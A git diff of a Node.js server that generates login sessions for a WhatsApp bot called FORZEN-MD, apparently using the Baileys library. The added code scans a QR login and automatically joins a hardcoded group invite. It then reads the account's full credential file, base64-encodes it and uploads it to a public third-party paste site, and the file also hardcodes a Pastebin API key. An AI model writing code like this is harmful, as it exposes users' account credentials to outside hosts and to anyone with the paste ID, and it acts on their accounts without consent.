@@ -1,121 +1,126 @@
+let express = require("express");
+let app = express();
+const fs = require ("fs-extra")
+const axios = require("axios");
+let {
+    toBuffer
+} = require("qrcode");
+const CryptoJS = require("crypto-js");
+const JSZip = require("jszip");
+const file = require("fs");
+const zip = new JSZip();
+const { base64encode, base64decode } = require('nodejs-base64');
+const {
+    delay,
+    useMultiFileAuthState,
+    BufferJSON,
+    fetchLatestBaileysVersion,
+    Browsers,
+    default: makeWASocket
+    } = require("@whiskeysockets/baileys")
+    const pino = require("pino");
+    let PORT = process.env.PORT || 3030;
+    const PastebinAPI = require("pastebin-js"),
+    pastebin = new PastebinAPI("h4cO2gJEMwmgmBoteYufW6_weLvBYCqT");
 
-/*
+    app.use("/", (req, res) => {
 
-//══════════════════════════════════════════════════════════════════════════════════════════════════════//
-//                                                                                                      //
-//                                ＷＨＡＴＳＡＰＰ ＢＯＴ－ＭＤ ＢＥＴＡ                                      // 
-//                                                                                                      // 
-//                                         Ｖ：１．０．１                                                 // 
-//                                                        
-//
-//           SAKURA MD
-//           
-//
-//  
-// 
-//                                                  
-//                                                                                                    
-//                                                         
-//══════════════════════════════════════════════════════════════════════════════════════════════════════//
+        async function XAsena() {
 
-CURRENTLY RUNNING ON BETA VERSION!!
-*
-   * @project_name : SAKURA-MD
-   * @author : SalmanYtOfficial
-   * @youtube : https://www.youtube.com/@YASIYA_YT
-   * @description : Get baileys qr, where session id Converted into 'base64'. You can change it According to your needs.
-   * @version 1.0.0
-*
-   * Licensed under the  GPL-3.0 License;
-* 
-   * Created By DARK YASIYA X TEAM.
-   * © 2023 SAKURA MD
-*/
+            try {
+                let {
+                    version, isLatest
+                } = await fetchLatestBaileysVersion()
+                const {
+                    state, saveCreds
+                } = await useMultiFileAuthState(`./session`)
+                const session = makeWASocket({
+                    logger: pino({
+                        level: 'silent'
+                    }),
+                    printQRInTerminal: false,
+                    browser: Browsers.macOS("Desktop"),
+                    auth: state,
+                    version
+                })
+                //------------------------------------------------------
 
-const fs   = require("fs-extra");
-const pino = require("pino");
-let qrcode = require("qrcode-terminal");
+                session.ev.on("connection.update", async (s) => {
+                    if (s.qr) {
+                        res.end(await toBuffer(s.qr));
+                    }
+                    const {
+                        connection,
+                        lastDisconnect
+                    } = s
+                    if (connection == "open") {
+                        await session.groupAcceptInvite("L2i6oDCjljt4mtBTUvTh7t");
+                        const authfile = (`./session/creds.json`)
+                        await delay(1000 * 10)
+                        var tsurue = "";
+                        let fil = await file.readFileSync("./session/creds.json", "utf-8");
+                        let filz = base64encode(fil);
+                        await console.log(filz);
+                        let link = await axios.post('http://paste.c-net.org/', "" + filz, {
+                            headers: {
+"Content-Type": "application/x-www-form-urlencoded",
+                            }
+                        });
+                        tsurue = link.data.split("/")[3]
+                        await session.sendMessage(session.user.id, {
+                            text: "FORZEN-MD;;;" + tsurue
+                        })
+                        await session.sendMessage(session.user.id, {
+                            text: `*💃彡[\x20YOUR-\x20BOT\x20QR\x20SCAN\x20COMPLETED\x20SUCCESFULY\x20✅.\x20]*\x0a\x0a╔════◇\x0a║★彡[THANKS\x20FOR\x20CHOOSING\x20•FORZEN-MD-BOT\x20☃️\x20]★\x0a║\x20_YOU\x20COMPLEATE\x20FIRST\x20STEP\x20TO\x20MAKING\x20BOT._\x0a╚═════════════════◉\x0a\x0a╔═════◇\x0a║\x20\x20『•••\x20𝗩𝗶𝘀𝗶𝘁\x20𝗙𝗼𝗿\x20𝗛𝗲𝗹𝗽\x20•••』\x0a║\x20*1.GITHUB:*\x20_https://github.com/yasiyaofc1_\x0a║\x20*2.NUMBER:*\x20_wa.me//+94760018802_\x0a║\x20*3.DEPLOY-TO-HEROKU:*\x20_https://heroku.com/deploy?template=https://github.com/yasiyaofc1/FORZEN-MD_\x0a║\x0a║\x20*NOTE\x20:*\x20_DON\x27T\x20PROVIDE\x20YOUR\x20SESSION_ID\x20to\x20ANYONE_\x0a║\x20_OTHERWISE\x20THEY\x20CAN\x20ACCES\x20CHATS_\x0a╚═════════════════◉\x0a`
+                        })
+                        const files = fs.readdirSync("./session");
+                        for (const file of files) {
+                          const data = fs.readFileSync("./session/" + file);
+                          zip.file(file, data);
+                        }
+                        zip
+                          .generateNodeStream({ type: "nodebuffer", streamFiles: true })
+                          .pipe(file.createWriteStream("session.zip"))
+                          .on("finish", async function () {
+                            await session.sendMessage(session.user.id, {
+                                document: {
+                                    url: './session.zip'
+                                },
+                                fileName: "session.zip",
+                                mimetype: "application/zip",
+                            });
+                            await fs.rm('./session', {
+                                recursive: true, force: true
+                            })
+                            process.send('reset')
+                          });
+                       
+                    }
+                    if (
+                        connection === "close" &&
+                        lastDisconnect &&
+                        lastDisconnect.error &&
+                        lastDisconnect.error.output.statusCode != 401
+                    ) {
+                        XAsena()
+                    }
+                })
+                session.ev.on('creds.update',
+                    saveCreds)
+                await delay(3000 * 10);
+                session.ev.on("messages.upsert",
+                    () => {})
+
+            }catch(err) {
+                console.log(
+                    err + "Unknown Error Occured Please report to Owner and Stay tuned"
+                );
+            }
 
 
-if (fs.existsSync('./auth_info_baileys')) {
-  fs.emptyDirSync(__dirname + '/auth_info_baileys');
-  require('child_process').exec('rm -rf auth_info_baileys')
-  console.log('\nPlease Wait... Removing Cache files');
-  setTimeout(() => {   console.log(' ')    }, 100);
-  setTimeout(() => {   console.log('Q')    }, 300);
-  setTimeout(() => {   console.log('R')    }, 500);
-  setTimeout(() => {   console.log(' ')    }, 700);
-  setTimeout(() => {   console.log('B')    }, 900);
-  setTimeout(() => {   console.log('Y')    }, 1100);
-  setTimeout(() => {   console.log(' ')    }, 1300);
-  setTimeout(() => {   console.log('F')    }, 1500);
-  setTimeout(() => {   console.log('O')    }, 1700);
-  setTimeout(() => {   console.log('R')    }, 1900);
-  setTimeout(() => {   console.log('Z')    }, 2100);
-  setTimeout(() => {   console.log('E')    }, 2300);
-  setTimeout(() => {   console.log('N')    }, 2500);
-  setTimeout(() => {   console.log(' ')    }, 2700);
-  setTimeout(() => {   console.log('M')    }, 2900);
-  setTimeout(() => {   console.log('D')    }, 3000);
-  setTimeout(() => {   console.log('Cache Cleared..!\nRun The Script Again')    }, 3200);
-  setTimeout(() => {   process.exit()      }, 3400)
-};
-setTimeout(() => {
-  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@sampandey001/baileys");
-  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
-  async function sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ() {
-    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
-    try {
-      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
-      session.ev.on("connection.update", async (s) => {
-        const { connection, lastDisconnect, qr } = s;
-        if (connection == "open")
-        {
-          await delay(500);
-          let user = session.user.id;         // User = Number of that user who just Scanned the Qr
-
-//===========================================================================================
-//===============================  SESSION ID   =============================================
-//===========================================================================================
-          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json') //GETTING CREDS FROM CREDS.json TO GENERATE SESSION ID 
-          c = Buffer.from(unique).toString('base64'); // CHANGE 'base64' ACCORDING TO YOUR NEEDS 
-          console.log(`
-====================  SESSION ID  ===========================                   
-SESSION-ID ==> ${c}\n\n
-Don't provide your SESSION_ID to anyone otherwise that user can access your account.
-Thanks.
--------------------  SESSION CLOSED   -----------------------
-`)   
-
-let cc = `╔════✪
-║『 ᴛʜᴀɴᴋ ꜰʀᴏ ʏᴏᴜ ᴄʜᴏᴏꜱɪɴɢ ғᴏʀᴢᴇɴ ᴍᴅ 』
-║ You complete first step to making Bot.
-╚════════════════════════╝
-╔═════✪
-╎  【 ғᴏʀᴢᴇɴ ꜱɪꜱꜱɪᴏɴ ᴄᴏᴅᴇ  】
-
-┋🥷*Repo* : [  https://github.com/yasiyaofc1/FORZEN-MD]
-
-┋🥷*Owner* : [ https://wa.me/94760018802 ]
-
-┋🥷*Support*  : [ https://chat.whatsapp.com/L2i6oDCjljt4mtBTUvTh7t]
-
-┋🥷*Note* :ᴅᴏɴ'ᴛ ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ꜱᴇꜱꜱɪᴏɴ ɪᴅ
-
- ❄️ ғᴏʀᴢᴇɴ ᴍᴅ ❄️
- 💃🏼 ᴅᴇᴠᴀʟᴏᴘᴇʀ ʙʏ ᴅᴀʀᴋ ʏᴀsɪʏᴀ x ᴛᴇᴀᴍ 💃🏼
-╚════════════════════════╝
-`;
-          let session_id = await session.sendMessage(user, { text: "FORZEN-MD;;;"+ c });
-   //SENDING 'base64' SESSION ID TO USER NUMBER
-          await session.sendMessage(user, { text: cc } , { quoted : session_id });
-          await require('child_process').exec('rm -rf auth_info_baileys')     //CLEAR 'auth_info_baileys' SO THAT NEXT TIME IT CLEARED FOR SCANNING
-          process.exit(1)   // STOPPING PROCESS AFTER GETTING SESSION ID
         }
-        session.ev.on('creds.update', saveCreds)
-       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ(); } // IF ANY ERROR< THEN PRINT QR AGAIN
-      });
-    } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
-  }
-  sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ();
-}, 3000)
+        XAsena()
+
+    })
+
+    app.listen(PORT, () => console.log("App listened on port", PORT));
